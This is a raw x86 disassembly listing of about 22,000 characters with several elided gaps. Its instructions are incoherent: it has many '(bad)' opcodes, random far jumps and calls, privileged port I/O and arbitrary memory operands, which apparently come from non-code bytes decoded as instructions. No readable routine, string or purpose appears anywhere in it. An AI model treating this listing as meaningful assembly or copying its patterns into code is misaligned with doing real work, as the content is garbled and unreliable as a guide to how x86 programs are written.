  42cb67:	call   0x9afa1789
  42cb6c:	out    dx,al
  42cb6d:	ret    0x656b
  42cb70:	in     al,dx
  42cb71:	ins    BYTE PTR es:[edi],dx
  42cb72:	aaa    
  42cb73:	xchg   ecx,eax
  42cb74:	inc    eax
  42cb75:	pop    esp
  42cb76:	std    
  42cb77:	add    esi,DWORD PTR [ebx+0x301410d6]
  42cb7d:	pop    edx
  42cb7e:	stos   DWORD PTR es:[edi],eax
  42cb7f:	or     esi,esp
  42cb81:	js     0x42cbbd
  42cb83:	imul   ebp,DWORD PTR [esi+0x16],0x5f
  42cb87:	cmp    ecx,DWORD PTR [ebp+0x20]
  42cb8a:	ss dec ecx
  42cb8c:	add    al,0x68
  42cb8e:	or     BYTE PTR [esi-0x38],0xe7
  42cb92:	lahf   
  42cb93:	xchg   DWORD PTR [eax+ebp*4-0x70],eax
  42cb97:	adc    dl,al
  42cb99:	inc    ecx
  42cb9a:	pop    esp
  42cb9b:	stos   BYTE PTR es:[edi],al
  42cb9c:	neg    BYTE PTR [eax+0x237f919d]
  42cba2:	inc    eax
  42cba3:	or     eax,0x1e0eec67
  42cba8:	aam    0xca
  42cbaa:	or     edx,DWORD PTR es:[edi]
  42cbad:	aam    0xc1
  42cbaf:	or     al,0x5
  42cbb1:	mov    ebp,0xba1f3d57
  42cbb6:	rcl    DWORD PTR [ecx-0x7aa224ac],0x60
  42cbbd:	inc    esp
  42cbbe:	sbb    edx,DWORD PTR ds:0x47e9c070
  42cbc4:	dec    ebx
  42cbc5:	rol    DWORD PTR [ebp+0x2e],0xc
  42cbc9:	inc    edx
  42cbca:	lds    edx,FWORD PTR [esi+0x208bcb89]
  42cbd0:	mov    fs,edi
  42cbd2:	aad    0xe
  42cbd4:	bound  esp,QWORD PTR [esi-0x47]
  42cbd7:	add    al,BYTE PTR ds:0x826cf3c7
  42cbdd:	shl    bh,cl
  42cbdf:	push   ebp
  42cbe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cbe1:	push   ebp
  42cbe2:	jge    0x42cb93
  42cbe4:	adc    DWORD PTR [esp+ebp*4+0x75],edi
  42cbe8:	sti    
  42cbe9:	sub    al,0xc9
  42cbeb:	xchg   edi,eax
  42cbec:	iret   
  42cbed:	and    BYTE PTR [esp+ebx*2-0x183041ab],ah
  42cbf4:	jle    0x42cc48
  42cbf6:	repz adc BYTE PTR [eax+0x3846fe0a],bh
  42cbfd:	sbb    dl,0x73
  42cc00:	jae    0x42cbd3
  42cc02:	mov    cl,dh
  42cc04:	mov    DWORD PTR [edx-0x60],0xe497b560
  42cc0b:	ja     0x42cc34
  42cc0d:	ss fwait
  42cc0f:	push   0x82
	...
  42cc74:	jg     0x42cc78
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0x27bdfb45
  42cc84:	or     eax,esp
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    eax,0xaf000001
  42cc8d:	pop    esi
  42cc8e:	ss js  0x42ccfc
  42cc91:	jnp    0x42cc73
  42cc93:	test   DWORD PTR [eax-0x375dd311],edi
  42cc99:	mov    eax,0xb190d80a
  42cc9e:	iret   
  42cc9f:	inc    edi
  42cca0:	xchg   edx,eax
  42cca1:	mov    dh,0xe5
  42cca3:	jo     0x42cd1f
  42cca5:	inc    esi
  42cca6:	jne    0x42cc50
  42cca8:	mov    ah,0xf0
  42ccaa:	out    dx,eax
  42ccab:	xor    BYTE PTR [eax],bh
  42ccad:	jnp    0x42cd27
  42ccaf:	sub    DWORD PTR [ecx+0x29ee645],ecx
  42ccb5:	clc    
  42ccb6:	mov    al,0x45
  42ccb8:	sub    al,0x67
  42ccba:	jo     0x42cc65
  42ccbc:	fwait
  42ccbd:	inc    edx
  42ccbe:	add    al,0x62
  42ccc0:	add    dl,bh
  42ccc2:	test   eax,0xcb9446e
  42ccc7:	sub    al,BYTE PTR [eax-0x5]
  42ccca:	cmp    esp,DWORD PTR ds:0x205c01a2
  42ccd0:	and    eax,0xd7a8df59
  42ccd5:	std    
  42ccd6:	int3   
  42ccd7:	fisubr WORD PTR [ebp-0x64256773]
  42ccdd:	inc    esi
  42ccde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ccdf:	pop    edi
  42cce0:	out    0x2a,eax
  42cce2:	adc    eax,0x97280314
  42cce7:	lods   eax,DWORD PTR ds:[esi]
  42cce8:	and    bh,BYTE PTR [edx-0x2d]
  42cceb:	les    esp,FWORD PTR [ecx-0x50]
  42ccee:	fxch   st(4)
  42ccf0:	(bad)  
  42ccf1:	fadd   QWORD PTR [ecx+0x306f179e]
  42ccf7:	push   ss
  42ccf8:	inc    esi
  42ccf9:	or     al,0x5c
  42ccfb:	push   edi
  42ccfc:	mov    eax,ds:0x68642f79
  42cd01:	inc    edx
  42cd02:	loopne 0x42cd24
  42cd04:	push   ds
  42cd05:	addr16 jne 0x42cd0a
  42cd08:	es sbb al,0x48
  42cd0b:	cdq    
  42cd0c:	pop    edx
  42cd0d:	in     eax,0x53
  42cd0f:	call   DWORD PTR [edx-0x56]
  42cd12:	sbb    al,0x65
  42cd14:	iret   
  42cd15:	push   eax
  42cd16:	lods   eax,DWORD PTR ds:[esi]
  42cd17:	dec    esp
  42cd18:	mov    al,ds:0x26c7521b
  42cd1d:	lock cmc 
  42cd1f:	or     ah,BYTE PTR [edx-0x5a]
  42cd22:	test   bl,ah
  42cd24:	test   DWORD PTR [eax+0x3c],edx
  42cd27:	push   ebp
  42cd28:	and    DWORD PTR [edi],0x42
  42cd2b:	jnp    0x42ccbe
  42cd2d:	jmp    0x42cce2
  42cd2f:	mov    bl,0x97
  42cd31:	ja     0x42cd08
  42cd33:	pop    ds
  42cd34:	repnz mov bl,0x0
  42cd37:	fldcw  WORD PTR [edi]
  42cd39:	std    
  42cd3a:	xchg   ecx,eax
  42cd3b:	rcr    BYTE PTR [edx+0x3af1bcf6],0x6c
  42cd42:	leave  
  42cd43:	nop
  42cd44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cd45:	rol    edi,cl
  42cd47:	sub    BYTE PTR [edx],0x2a
  42cd4a:	or     DWORD PTR [edx],ebp
  42cd4c:	cmp    eax,0xc800f92f
  42cd51:	xchg   ebp,eax
  42cd52:	cdq    
  42cd53:	xchg   esi,eax
  42cd54:	dec    edx
  42cd55:	push   ebx
  42cd56:	pop    ecx
  42cd57:	mov    BYTE PTR [edx],ah
  42cd59:	leave  
  42cd5a:	dec    edx
  42cd5b:	and    ebp,DWORD PTR [esi+0xd]
  42cd5e:	sub    al,0xee
  42cd60:	pop    edi
  42cd61:	das    
  42cd62:	add    al,0x3
  42cd64:	je     0x42cd16
  42cd66:	imul   edi,ebx,0xffffff9c
  42cd69:	or     ebp,DWORD PTR [edx+0x7e45c2c2]
  42cd6f:	inc    edi
  42cd70:	cli    
  42cd71:	mov    eax,0xd68a6968
  42cd76:	out    0xb,eax
  42cd78:	int    0xa9
  42cd7a:	dec    ebx
  42cd7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cd7c:	loop   0x42cd9d
  42cd7e:	cwde   
  42cd7f:	idiv   BYTE PTR [edx-0x18e16f39]
  42cd85:	or     bh,ch
  42cd87:	inc    eax
  42cd88:	xor    DWORD PTR [esi+0x343d0baf],esi
  42cd8e:	mov    bh,dh
  42cd90:	cdq    
	...
  42cdf1:	add    BYTE PTR [eax],al
  42cdf3:	add    BYTE PTR [ecx],bl
  42cdf5:	mov    eax,ds:0xdffe87fe
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0x19
  42ce01:	lods   al,BYTE PTR ds:[esi]
  42ce02:	xlat   BYTE PTR ds:[ebx]
  42ce03:	xor    eax,0x1e10e
  42ce08:	add    eax,0x4d000001
  42ce0d:	inc    eax
  42ce0e:	pop    edx
  42ce0f:	xchg   ebx,eax
  42ce10:	pop    ebx
  42ce11:	es lock pushf 
  42ce14:	out    0x4e,al
  42ce16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ce17:	inc    edi
  42ce18:	push   edx
  42ce19:	jmp    0x3929:0x140a8ca8
  42ce20:	mov    al,ds:0xfc200c8c
  42ce25:	push   edx
  42ce26:	jbe    0x42ce85
  42ce28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ce29:	repz call DWORD PTR [ebx+0x44]
  42ce2d:	int    0xcf
  42ce2f:	test   BYTE PTR [esi],bl
  42ce31:	jmp    0x38c4:0x3106c941
  42ce38:	sbb    eax,0x499ad2b8
  42ce3d:	(bad)  
  42ce3e:	das    
  42ce3f:	idiv   ecx
  42ce41:	retf   0xa0d3
  42ce44:	(bad)  
  42ce45:	push   ebp
  42ce46:	call   0xb48003e7
  42ce4b:	lea    ecx,[edx]
  42ce4d:	mov    ebp,0xfec4af7
  42ce52:	dec    esi
  42ce53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ce54:	es jg  0x42ce0d
  42ce57:	(bad)  
  42ce58:	and    eax,0xf504b3c7
  42ce5d:	shl    BYTE PTR [ecx-0x6a],1
  42ce60:	sbb    edi,esi
  42ce62:	sbb    al,0x6a
  42ce64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ce65:	test   BYTE PTR [ebp-0x7d8b6064],cl
  42ce6b:	out    0x5e,al
  42ce6d:	imul   edx,DWORD PTR [esi-0x3c],0x15fda6fd
  42ce74:	jge    0x42cebf
  42ce76:	je     0x42ceec
  42ce78:	test   BYTE PTR [ecx],dl
  42ce7a:	(bad)  
  42ce7b:	and    bh,BYTE PTR [edx]
  42ce7d:	or     BYTE PTR [eax],bl
  42ce7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ce80:	test   BYTE PTR [ebp+edx*2-0x36777747],ch
  42ce87:	or     edi,DWORD PTR [ebx-0x6f2499a6]
  42ce8d:	fsubr  QWORD PTR [edx-0x68df07e3]
  42ce93:	and    ecx,DWORD PTR ds:0x37347f8a
  42ce99:	repz or BYTE PTR [ebp+0x75bb726a],bl
  42cea0:	sub    DWORD PTR [edx],0xd2fbb905
  42cea6:	dec    ebx
  42cea7:	fldcw  WORD PTR [ecx-0xd]
  42ceaa:	clc    
  42ceab:	cmp    eax,0xa3b0a01
  42ceb0:	lahf   
  42ceb1:	cdq    
  42ceb2:	popf   
  42ceb3:	adc    edx,DWORD PTR [ecx-0x18]
  42ceb6:	jno    0x42ce61
  42ceb8:	mov    bl,cl
  42ceba:	out    0xcb,al
  42cebc:	cmp    esp,DWORD PTR ds:0x3b53f799
  42cec2:	push   ss
  42cec3:	scas   al,BYTE PTR es:[edi]
  42cec4:	sbb    edx,esi
  42cec6:	mul    al
  42cec8:	es jns 0x42cf05
  42cecb:	mov    eax,0x5238389f
  42ced0:	jbe    0x42ce53
  42ced2:	lods   eax,DWORD PTR ds:[esi]
  42ced3:	sub    eax,0xc50c89d7
  42ced8:	xchg   ebx,eax
  42ced9:	push   esp
  42ceda:	mov    ebp,0x50971e9b
  42cedf:	adc    DWORD PTR [eax-0x4d],eax
  42cee2:	loope  0x42ce87
  42cee4:	shl    BYTE PTR ds:0xa402b51,0x20
  42ceeb:	jns    0x42cf37
  42ceed:	add    al,0x78
  42ceef:	mov    ds:0xfa5c9a3,eax
  42cef4:	icebp  
  42cef5:	dec    esp
  42cef6:	mov    eax,0xf706e311
  42cefb:	sub    ch,BYTE PTR [edi+ebx*8-0xd9375cb]
  42cf02:	imul   edi,DWORD PTR [esi-0x24],0xc1ddacfa
  42cf09:	jge    0x42cee8
  42cf0b:	and    esp,ebx
  42cf0d:	div    BYTE PTR [edx+0xe385]
	...
  42cf73:	add    BYTE PTR [ebx+0x3d],dh
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	les    edx,FWORD PTR [edi+0x72]
  42cf82:	cmp    DWORD PTR [edx+0x1e213],eax
  42cf88:	add    eax,0x68000001
  42cf8d:	cld    
  42cf8e:	call   0xf37e4bc9
  42cf93:	aas    
  42cf94:	sub    BYTE PTR [ebx],al
  42cf96:	inc    esp
  42cf97:	adc    eax,0x53e4d79c
  42cf9c:	jne    0x42cff0
  42cf9e:	cmc    
  42cf9f:	xchg   esi,eax
  42cfa0:	(bad)  
  42cfa1:	adc    BYTE PTR [esi-0x5c],dh
  42cfa4:	data16 aad 0xb5
  42cfa7:	scas   eax,DWORD PTR es:[edi]
  42cfa8:	bound  edi,QWORD PTR [ebx+esi*4]
  42cfab:	cwde   
  42cfac:	xor    DWORD PTR ds:0x24595daa,0x41c13695
  42cfb6:	adc    eax,0x4f3ae816
  42cfbb:	mov    eax,0xf5cdaf2c
  42cfc0:	in     eax,0xef
  42cfc2:	and    eax,0x44027281
  42cfc7:	dec    eax
  42cfc8:	inc    ebp
  42cfc9:	stc    
  42cfca:	jge    0x42cfd0
  42cfcc:	cdq    
  42cfcd:	in     eax,dx
  42cfce:	jmp    0xa61c:0x171cab2
  42cfd5:	mov    fs,WORD PTR [ecx+0x1931f895]
  42cfdb:	pop    esp
  42cfdc:	fs mov bh,0xe0
  42cfdf:	ret    
  42cfe0:	scas   al,BYTE PTR es:[edi]
  42cfe1:	mov    esp,0x37212fde
  42cfe6:	lock push esi
  42cfe8:	xor    al,0xbd
  42cfea:	ja     0x42cff8
  42cfec:	mov    bh,0x12
  42cfee:	sti    
  42cfef:	jmp    eax
  42cff1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cff2:	bound  ebx,QWORD PTR [edx]
  42cff4:	das    
  42cff5:	and    al,ch
  42cff7:	adc    eax,0x4f5bf13d
  42cffc:	or     al,bh
  42cffe:	jno    0x42cf9d
  42d000:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d001:	jno    0x42d006
  42d003:	jp     0x42cfba
  42d005:	mov    ds:0xb9f64fcc,eax
  42d00a:	mov    edx,0x1542783a
  42d00f:	push   eax
  42d010:	mov    ds:0x8470cfcd,eax
  42d015:	repnz retf 
  42d017:	mov    ah,bh
  42d019:	push   cs
  42d01a:	es pop eax
  42d01c:	or     eax,0xa4cf4fc7
  42d021:	adc    esi,edi
  42d023:	cdq    
  42d024:	adc    DWORD PTR [ecx],0xffffffd5
  42d027:	popa   
  42d028:	jne    0x42cfb7
  42d02a:	and    eax,0xab00e8ae
  42d02f:	je     0x42d03e
  42d031:	or     DWORD PTR [ebp+0x53fed731],0x64
  42d038:	pop    esi
  42d039:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d03a:	adc    eax,0x581bb000
  42d03f:	neg    DWORD PTR [edi+0x75]
  42d042:	lods   eax,DWORD PTR ds:[esi]
  42d043:	jmp    0x42d045
  42d045:	and    DWORD PTR [esi+0x4f],ebp
  42d048:	xchg   esi,eax
  42d049:	retf   
  42d04a:	jnp    0x42d09a
  42d04c:	push   ss
  42d04d:	das    
  42d04e:	retf   0x3904
  42d051:	gs nop
  42d053:	out    dx,al
  42d054:	cmp    DWORD PTR [ecx-0x21],ebx
  42d057:	je     0x42d064
  42d059:	dec    ebx
  42d05a:	test   eax,0x187fac9d
  42d05f:	je     0x42d064
  42d061:	xor    al,0x18
  42d063:	or     DWORD PTR [esp+eax*4-0x66c49a72],esp
  42d06a:	mov    ah,0xab
  42d06c:	mov    ah,0xe0
  42d06e:	lods   eax,DWORD PTR ds:[esi]
  42d06f:	push   eax
  42d070:	loopne 0x42d064
  42d072:	jge    0x42d022
  42d074:	pop    esi
  42d075:	call   0xc79378d0
  42d07a:	cld    
  42d07b:	mov    dh,0x5
  42d07d:	jo     0x42d0c3
  42d07f:	cmp    al,0x95
  42d081:	push   eax
  42d082:	push   es
  42d083:	test   al,0x17
  42d085:	cld    
  42d086:	mov    ?,WORD PTR [edx]
  42d088:	mov    BYTE PTR [esi],ah
  42d08a:	dec    esi
  42d08b:	and    eax,0xd9628d10
  42d090:	pop    ebp
	...
  42d0f1:	add    BYTE PTR [eax],al
  42d0f3:	add    BYTE PTR [eax+0x3a],dl
  42d0f6:	(bad)  
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    ch,dl
  42d101:	loope  0x42d138
  42d103:	sbb    DWORD PTR [eax],0x50001e3
  42d109:	add    DWORD PTR [eax],eax
  42d10b:	add    al,al
  42d10d:	xchg   edx,eax
  42d10e:	jne    0x42d12b
  42d110:	cmp    DWORD PTR [esi-0x753db12c],ebp
  42d116:	(bad)  
  42d117:	leave  
  42d118:	lods   al,BYTE PTR ds:[esi]
  42d119:	sbb    ah,ch
  42d11b:	jmp    0x29e1:0x414a43a3
  42d122:	js     0x42d0fb
  42d124:	xchg   BYTE PTR [esi-0x11478167],dh
  42d12a:	xor    BYTE PTR [eax+0x32],0x9f
  42d12e:	into   
  42d12f:	test   al,0x8b
  42d131:	inc    ebp
  42d132:	xchg   edx,eax
  42d133:	add    dl,bl
  42d135:	add    ebx,DWORD PTR [eax-0x3f561ef7]
  42d13b:	bound  edi,QWORD PTR [edi+0x1c]
  42d13e:	ffreep st(5)
  42d140:	mov    eax,ds:0x1ea2f5f6
  42d145:	mov    esi,0xcbdb707b
  42d14a:	sub    bp,WORD PTR [edx+0x164dd913]
  42d151:	adc    DWORD PTR [ebx-0x74],edx
  42d154:	loop   0x42d1c4
  42d156:	fld    DWORD PTR [esi+0x2c]
  42d159:	jle    0x42d1ae
  42d15b:	xchg   ecx,eax
  42d15c:	jmp    0x3062:0x6d70bfa8
  42d163:	add    dl,dh
  42d165:	push   esp
  42d166:	loop   0x42d1e6
  42d168:	push   edx
  42d169:	hlt    
  42d16a:	mov    al,ds:0xd11bf08b
  42d16f:	jbe    0x42d115
  42d171:	sar    BYTE PTR [ebp+0x154a6e9a],0xc2
  42d178:	or     al,0x6e
  42d17a:	jmp    0x8cfc4274
  42d17f:	icebp  
  42d180:	scas   al,BYTE PTR es:[edi]
  42d181:	or     eax,ebp
  42d183:	pop    esi
  42d184:	push   es
  42d185:	scas   al,BYTE PTR es:[edi]
  42d186:	mov    ds:0xc5d01be8,eax
  42d18b:	in     eax,0xf8
  42d18d:	test   edx,edi
  42d18f:	dec    ebx
  42d190:	adc    DWORD PTR [esi],ebp
  42d192:	mov    ds:0xc3a400b1,al
  42d197:	mov    BYTE PTR [eax+esi*4],bl
  42d19a:	pop    es
  42d19b:	dec    ecx
  42d19c:	xchg   edi,eax
  42d19d:	mov    edi,0x26785bb9
  42d1a2:	ds inc esi
  42d1a4:	jg     0x42d1ba
  42d1a6:	test   BYTE PTR [bx+si-0x57],0xea
  42d1ab:	sub    DWORD PTR [edi],esi
  42d1ad:	sub    BYTE PTR [ecx+0x457b1d0b],0xea
  42d1b4:	movzx  ebp,BYTE PTR [esi-0x7]
  42d1b8:	les    eax,FWORD PTR [edx]
  42d1ba:	adc    ah,0x34
  42d1bd:	or     esi,DWORD PTR [esi-0x67]
  42d1c0:	sub    ebp,ecx
  42d1c2:	mov    DWORD PTR [edi],ebx
  42d1c4:	lods   eax,DWORD PTR ds:[esi]
  42d1c5:	outs   dx,DWORD PTR ds:[esi]
  42d1c6:	sbb    BYTE PTR [edi+0x5ed957c],bh
  42d1cc:	pop    esi
  42d1cd:	aad    0xe7
  42d1cf:	lods   eax,DWORD PTR ds:[esi]
  42d1d0:	fmul   QWORD PTR [edx]
  42d1d2:	push   cs
  42d1d3:	add    al,0x18
  42d1d5:	mov    cl,0x2f
  42d1d7:	mov    ds:0xbd20f08d,eax
  42d1dc:	fstp   QWORD PTR [edx+0x64a1857d]
  42d1e2:	push   cs
  42d1e3:	mov    ds:0x5586b66,al
  42d1e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d1e9:	cmc    
  42d1ea:	adc    ebp,eax
  42d1ec:	stos   BYTE PTR es:[edi],al
  42d1ed:	jae    0x42d229
  42d1ef:	xchg   edx,eax
  42d1f0:	add    dh,BYTE PTR [edi]
  42d1f2:	ror    DWORD PTR [edi+edx*1+0x69819fc3],0x39
  42d1fa:	imul   edi,DWORD PTR [eax-0x6b5cf005],0xffffffcc
  42d201:	jge    0x42d26b
  42d203:	dec    eax
  42d204:	or     edi,DWORD PTR [ebx]
  42d206:	cs jp  0x42d1e0
  42d209:	sbb    DWORD PTR [eax],0x264381
  42d20f:	ds test al,0x0
	...
  42d272:	add    BYTE PTR [eax],al
  42d274:	lea    ecx,[eax]
  42d276:	pop    ebp
  42d277:	jbe    0x42d256
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d29e
  42d281:	int3   
  42d282:	mov    eax,0x1e41d44
  42d287:	add    BYTE PTR ds:0xf000001,al
  42d28d:	loope  0x42d292
  42d28f:	lods   eax,DWORD PTR ds:[esi]
  42d290:	push   eax
  42d291:	mov    ah,ah
  42d293:	jno    0x42d30e
  42d295:	cmp    eax,ecx
  42d297:	mov    ds:0x4742abf2,al
  42d29c:	call   0x568f:0xcb77c9dd
  42d2a3:	xlat   BYTE PTR ds:[ebx]
  42d2a4:	ja     0x42d240
  42d2a6:	fwait
  42d2a7:	stos   DWORD PTR es:[edi],eax
  42d2a8:	pop    edi
  42d2a9:	fst    QWORD PTR [esi-0x2e]
  42d2ac:	cmp    cl,BYTE PTR [esi-0x2a]
  42d2af:	out    0xb2,al
  42d2b1:	mov    ah,0xef
  42d2b3:	xor    eax,0xfe098f7a
  42d2b8:	inc    esi
  42d2b9:	xchg   DWORD PTR [edx+0x11],esp
  42d2bc:	xor    eax,0xb5de4c9f
  42d2c1:	jle    0x42d2c5
  42d2c3:	jmp    0x42d31c
  42d2c5:	sub    al,0xdd
  42d2c7:	out    dx,eax
  42d2c8:	stos   BYTE PTR es:[edi],al
  42d2c9:	add    ebp,DWORD PTR [esi+0x2e]
  42d2cc:	(bad)  [eax+0x4a]
  42d2cf:	aaa    
  42d2d0:	in     al,dx
  42d2d1:	adc    eax,0x8e145d42
  42d2d6:	(bad)  
  42d2d7:	pop    ss
  42d2d8:	mov    bl,0x9e
  42d2da:	mov    al,ds:0x2dd9a072
  42d2df:	jno    0x42d275
  42d2e1:	inc    ebp
  42d2e2:	jne    0x42d2bb
  42d2e4:	add    DWORD PTR [ecx+0x4ce54c5d],0xffffff8f
  42d2eb:	das    
  42d2ec:	push   0x77
  42d2ee:	rol    BYTE PTR [eax],0x46
  42d2f1:	push   0x20
  42d2f3:	push   edi
  42d2f4:	fmul   st(5),st
  42d2f6:	int    0x9a
  42d2f8:	rol    BYTE PTR [edi],1
  42d2fa:	clc    
  42d2fb:	mov    dh,0xf
  42d2fd:	push   edi
  42d2fe:	icebp  
  42d2ff:	test   al,0x3b
  42d301:	pop    edi
  42d302:	mov    ecx,0x913fb6c8
  42d307:	mov    ch,0x4d
  42d309:	retf   0x41d1
  42d30c:	or     edi,DWORD PTR [ecx-0x68d9755f]
  42d312:	dec    esp
  42d313:	in     al,dx
  42d314:	or     eax,0xf0d8b2b9
  42d319:	mov    bl,0x5c
  42d31b:	imul   esp,DWORD PTR [eax],0x15
  42d31e:	mov    al,ds:0xb81c7ed5
  42d323:	aaa    
  42d324:	jne    0x42d307
  42d326:	ds es jmp 0x92bd:0xd8c53abd
  42d32f:	mov    ecx,0x1d5a9108
  42d334:	(bad)  
  42d335:	sahf   
  42d336:	sbb    al,0xad
  42d338:	inc    eax
  42d339:	push   ebx
  42d33a:	pop    es
  42d33b:	sub    dh,BYTE PTR [ecx]
  42d33d:	popa   
  42d33e:	xchg   esp,eax
  42d33f:	cmp    DWORD PTR [esi+edx*4+0x62],esi
  42d343:	dec    DWORD PTR [ecx]
  42d345:	icebp  
  42d346:	outs   dx,BYTE PTR ds:[esi]
  42d347:	iret   
  42d348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d349:	stos   BYTE PTR es:[edi],al
  42d34a:	jmp    0xe2bbc923
  42d34f:	fist   WORD PTR [esi]
  42d351:	cmp    esp,ecx
  42d353:	mov    bl,0xd1
  42d355:	jnp    0x42d31e
  42d357:	jecxz  0x42d3c9
  42d359:	mov    ebp,0x8dca5744
  42d35e:	mov    ch,0xf9
  42d360:	or     ah,BYTE PTR [eax]
  42d362:	sbb    bh,BYTE PTR [edx+0x52]
  42d365:	adc    al,0x90
  42d367:	retf   
  42d368:	mov    edi,DWORD PTR [esi]
  42d36a:	shl    BYTE PTR [ebx+eiz*2],cl
  42d36d:	fwait
  42d36e:	imul   esi,DWORD PTR [ecx],0xffffffe8
  42d371:	mov    ah,0xc
  42d373:	clc    
  42d374:	(bad)  
  42d375:	iret   
  42d376:	fidivr DWORD PTR [esi]
  42d378:	ficomp DWORD PTR [edx+0x1fbee6fa]
  42d37e:	dec    edx
  42d37f:	cmp    BYTE PTR [ebx],dl
  42d381:	icebp  
  42d382:	cwde   
  42d383:	sub    eax,0x54541d9a
  42d388:	xchg   edx,eax
  42d389:	rcl    DWORD PTR [ebp-0x7c],0xe6
  42d38d:	xor    DWORD PTR [ecx-0x78],edx
  42d390:	stos   DWORD PTR es:[edi],eax
	...
  42d3f1:	add    BYTE PTR [eax],al
  42d3f3:	add    cl,al
  42d3f5:	into   
  42d3f6:	arpl   WORD PTR [ecx-0x21044291],bx
  42d3fc:	pop    ecx
  42d3fd:	xchg   esp,eax
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	mov    WORD PTR [esp+ebp*8+0x72],es
  42d404:	and    ah,ch
  42d406:	add    DWORD PTR [eax],eax
  42d408:	add    eax,0x3000001
  42d40d:	sbb    DWORD PTR [ecx],edi
  42d40f:	lods   al,BYTE PTR ds:[esi]
  42d410:	fcomp  DWORD PTR [esi+esi*8]
  42d413:	fsubr  DWORD PTR [eax+0x5c53b920]
  42d419:	jmp    0x19e75e84
  42d41e:	xchg   esi,eax
  42d41f:	mov    edx,ebp
  42d421:	call   0xf6c7b163
  42d426:	add    cl,BYTE PTR [edx]
  42d428:	nop
  42d429:	shl    BYTE PTR [eax+0x11],cl
  42d42c:	mov    edi,0xd917fa44
  42d431:	fdiv   st(0),st
  42d433:	daa    
  42d434:	ja     0x42d488
  42d436:	fs aas 
  42d438:	add    bl,BYTE PTR [ecx-0x3f]
  42d43b:	sub    edi,DWORD PTR [edx+0x18]
  42d43e:	(bad)  
  42d43f:	ins    BYTE PTR es:[edi],dx
  42d440:	std    
  42d441:	push   ebx
  42d442:	shl    BYTE PTR [esi-0x6e],cl
  42d445:	dec    ecx
  42d446:	mov    al,0xb9
  42d448:	pop    ebp
  42d449:	push   eax
  42d44a:	xlat   BYTE PTR ds:[ebx]
  42d44b:	push   es
  42d44c:	sub    al,0x8b
  42d44e:	and    eax,0xd7da80dc
  42d453:	sub    BYTE PTR [ebx+0x749f91e4],0xe8
  42d45a:	adc    DWORD PTR [edx],0x6b8daee6
  42d460:	outs   dx,DWORD PTR ds:[esi]
  42d461:	bound  ebp,QWORD PTR [ebx+eiz*4-0x1f565a71]
  42d468:	adc    al,0x55
  42d46a:	jae    0x42d414
  42d46c:	lds    edx,FWORD PTR [edx-0x1ad41627]
  42d472:	or     ebx,DWORD PTR [edx-0xd]
  42d475:	dec    ebx
  42d476:	or     dh,BYTE PTR [esi]
  42d478:	adc    cl,BYTE PTR ds:0x6690eaa
  42d47e:	cmp    cl,ch
  42d480:	repz and eax,edx
  42d483:	in     eax,dx
  42d484:	lock sbb ecx,esi
  42d487:	fwait
  42d488:	mov    bh,0xd0
  42d48a:	pop    edi
  42d48b:	mov    dh,BYTE PTR [ebx+0x57]
  42d48e:	mov    DWORD PTR [ebx],ecx
  42d490:	(bad)  
  42d491:	fsubr  DWORD PTR [ecx+0x47db9818]
  42d497:	sub    eax,0x302c35ab
  42d49c:	add    DWORD PTR [eax+0x51],0xffffffe8
  42d4a0:	addr16 push ebp
  42d4a2:	lods   al,BYTE PTR cs:[esi]
  42d4a4:	mov    ds:0x41b272c8,al
  42d4a9:	retf   
  42d4aa:	iret   
  42d4ab:	jl     0x42d453
  42d4ad:	mov    ds:0x6afd56ba,al
  42d4b2:	mov    cl,ch
  42d4b4:	push   ds
  42d4b5:	les    esi,FWORD PTR [esi+0x63591401]
  42d4bb:	into   
  42d4bc:	inc    edx
  42d4bd:	jb     0x42d4e6
  42d4bf:	jns    0x42d4b1
  42d4c1:	xchg   ecx,eax
  42d4c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d4c3:	(bad)  
  42d4c4:	lea    edx,ss:[edi-0x37]
  42d4c8:	outs   dx,DWORD PTR ds:[esi]
  42d4c9:	js     0x42d520
  42d4cb:	inc    edi
  42d4cc:	and    DWORD PTR [ebx+0x588047f7],edi
  42d4d2:	(bad)  
  42d4d3:	pop    esp
  42d4d4:	mov    ah,0x24
  42d4d6:	inc    esp
  42d4d7:	lock xchg ecx,eax
  42d4d9:	jecxz  0x42d498
  42d4db:	and    al,0x2
  42d4dd:	or     eax,DWORD PTR [eax]
  42d4df:	sti    
  42d4e0:	ins    BYTE PTR es:[edi],dx
  42d4e1:	jb     0x42d4fa
  42d4e3:	scas   al,BYTE PTR es:[edi]
  42d4e4:	fsubr  st,st(7)
  42d4e6:	stos   DWORD PTR es:[edi],eax
  42d4e7:	(bad)  
  42d4e8:	ja     0x42d478
  42d4ea:	test   eax,0x2bb5b1d9
  42d4ef:	push   ds
